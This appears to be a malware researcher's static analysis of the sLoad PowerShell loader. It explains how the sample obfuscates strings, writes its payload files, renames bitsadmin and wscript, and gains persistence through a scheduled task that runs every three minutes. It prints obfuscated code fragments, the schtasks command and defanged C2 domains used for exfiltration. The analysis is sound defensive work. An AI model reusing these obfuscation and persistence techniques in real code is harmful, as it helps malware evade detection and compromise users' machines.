# Static code analysis of sLoad (ver="2.9.3")

## Introduction

The sample I have been investigating was executed by a copy of `powershell.exe` , which took as parameter a .gif file. The powershell.exe copy was named with random letters, and it was saved in `\appdata\roaming`, just like the .gif file. The technique of renaming legitimate Windows executable was used again throughout the code.

Notably the .gif file, which I will be calling "malicious.gif", currently has a score of 1/59 on Virustotal and was first on the 15th of July, 2020. The domains used to exfiltrate data have a "first seen time" on Virustotal on the first week of July 2020.

Of course, in typical sLoad fashion, the beginning Powershell script is heavily obfuscated and contains close to none suspicious keywords, as it employs many different code obusfaction techniques.

## First steps: malicious.gif

The code is around 5600 lines long, and contains all it needs to write itself on the disk and gain persistence, which is achieved through a scheduled task that executes the malware every three minutes.

How I tackled the code is I skimmed through it with the help of the navigator tab in Sublime, and detected this structure:

1. random and useless variables (presumably to change the hash value) and definition of a few global variables
2. definition of *system.ini* (around 5400 lines)
3. definition of *win.ini*
5. definition of other text files/scripts and scheduled tasks

Parts 2 and 3 take up the majority of the code.

### 1 (getting ready)
The firs 50 lines have some random variable which get referenced nowhere else, such as the following:

(sublime_1)

They can of course be safely removed.
Another obfuscation/filter evasion technique is the following, which is used many times throughout the code:

(sublime_2)

All numbers are deleted (replaced with nothing), so the string becomes "\AppData\Roaming\". Searching for "replace" on the code shows 7 matches, but I believe the most intersting ones are these, which are found in the first part of the code:

```

$oyqTbhcJKV="*(/#*c*# ^^*c**(o*)(^p***y() !@/!*#(Z* (#c!#:*\*W!(i)(@n)d((o(*()w!^^)s*\**)S(*(y^s(@)*W*^^O*#*W((6#4*(*)\*b@#(i*)t^#!s*a))(d)((m)^i*(n*#^.@*e(*x*))e**^ *()r@)*i#((!F!(^B!*#z!()o#@t*#(.*e(#(x)(e(*" -replace '([\(\!\*\(\@\)\*\#\^])'

$dedizMDdAnX="*@/@*(c#! !@((c*)*o#*(p*@(y(( *!*^/*@^#Z**( *c@!#:^#*\*(*W(#(*i!*n@@!^d(!o*)@w*(**s(\*S(@*y^!@s*^*!W()(O!^(*W!*(6^4*\*#w*@s@@c)^r(^i!*p((t)(.(!e@x)e*!^ ((*^ ()C*((#R(i(w()T@(@p@(y!^(#^D*!.!*e!)(x*)@e#" -replace '([\*\^\!\(\(\#\@\*\)])'

```

They are used to obfuscate the real commands, which are copying bitsadmin and wscript to randomly named executables, such as with powershell. Here they are unobfuscated (notice how they are then invoked with `cmd`):

(sublime_3)

The code also creates some random variables which will be used to name the directory in %appdata% and the dropped files:

(sublime_4)

Other initial variables the code creates are the following:

```
$hh='hi'+'dd'+'en';
$ldkrIR="";
$xjTmvrFuKEDUWZ = "`r`n"

```

The first one is "hidden", the second one is just empty and the third one is new line. They will be used throughout the code to avoid detection.

One last thing worth mentioning is that the code checks whether there is already a task that it created running, and if found it disables it.

Here is a screeshot of the whole first obfuscated part of the code:

(sublime_5)

### 2 & 3 (writing the payload)

The technique used to write the two most important files to disk is the following: 16 characters strings are subsequently appended to a variable, which is then written using `out-file`.

Following are the codes, which I redacted for brevity:

(sublime_6)

They gets written to the temp folder created in the first part of the code.
Nothing of interest is found at this time on these two files, which are used only later. They contain all the code needed for the exfiltration, in particular win.ini contains the C2 domains.

### 4 (gaining persistence)

The last part of the code is again very interesting from a deobfuscation point of view, as it employs many different techniques. Two big portions of the code are aimed at creating a .txt file and a .ps1 file, which are the used by the payload. They use the same technique in part 2 and 3, albeit with some minor changes:

This is part of the code that writes the .txt file:

(sublime_7)

It appends the strings to a variable, but the strings are plaintext. Also, it uses `$xjTmvrFuKEDUWZ` and `$ldkrIR` which are the new line and the empty char respectively, mentioned in part 1.

Once unobfuscated the code that creates the .txt string is very interesting: it uses two functions which are there exclusively to decode the text of the code itself using RegExp! Here it is:

(sublime_8)

I'll manually add the last line of code, as it deserves a particular analysis:

```
avgUs.run gEGaGH("p62o46w38e46r77s29h7e19l18l72 56-53e8p78 60b74y93p12a87s83s86 56-79f67i19l76e70") & " '+$SDLUpTpGMpqcF+'" & FDQiHDTMtjIfuIuENJTb(".233p87s25153"),0,true
```

So the WScript object parameters are obtained by using `gEGaGH`, which substitutes every number with nothing, and `FDQiHDTMtjIfuIuENJTb`, which substitues every number but `1` with nothing: this is because otherwise the powershell extension `.ps1` would not be correctly written. I like to imagine how this must have caused some errors during the coding of the malware, which resulted in the need to create two distinct functions!
So avgUs becomes this:

(sublime_9)

And runs the powershell file.

The .ps1 file is possibly even more interesting, although rather straightforward as it simply executes *system.ini*. The final code also uses the `-replace` technique mentioned in part 1 and Regular Expressions to mask strings.

Note: `$Vh` is an array of 18 random Cmdlets.

This is the obfuscated code:

(sublime_11)

This is the deobfuscated version:

(sublime_10) 

Finally, the last three lines of code create the scheduled task and execute it, then killing powershell (nice touch).

This is the line where the scheduled task is created, and we are now able to understand every piece:

```
$hWUHsjdaCKUaSaQwQ='/C schtasks /F /%windir:~0,1%reate /sc minute /mo 3 /TN "S'+$rs+$ezAdXVUDiUiZdERVV+'" /ST 07:00 /TR "'+$mRiDMVGkRsmxDiCggXsF+'\CRiwTpyD.exe /E:vbscript '+$mRiDMVGkRsmxDiCggXsF+'\'+$SDLUpTpGMpqcF+'.txt"';

start-process -windowstyle $hh cmd $hWUHsjdaCKUaSaQwQ;
```


`schtasks /F /%windir:~0,1%reate /sc minute /mo 3` -> the task is scheduled using /F (deletes the task and stops if the task is already running). It runs every 3 minutes.
`/TN "S'+$rs+$ezAdXVUDiUiZdERVV+'"` -> the task name is based upon the name of the folder in %temp%
`/ST 07:00` -> starts at 7am
`/TR` -> runs a program
`$mRiDMVGkRsmxDiCggXsF` -> current randomly named directory
`CRiwTpyD.exe` -> wscript
`$SDLUpTpGMpqcF` -> .txt file that runs the .ps1 script, that runs *system.ini*

## Artifacts on an infected machine

I have run the code on a Windows10 machine. These are the contents on the folder in %temp%:

(windows_1)

This is the scheduled task:

(windows_2)

## The malware

As my aim was primarily focused on the obfuscation technique employed by the actor, I will not go into the details of how the malware operates.
The content of *system.ini* is still somewhat obfuscated, and exfiltrates all kinds of information from the computer.

The first lines contain the versions of the malware, which get also sent to the C2:

(system_1)

This is what gets sent, notice that the versions variables appear:

(system_2)

There seems to be still Star Wars reference, given the variables `Yoda`, `Maul`, `clone` and `droids` used in the code.

The data is exfiltrated using bitsadmin and the C2 are hardcoded in win.ini:

hxxps://lwyhef[.]eu/topic/
hxxps://ponmer[.]eu/topic/


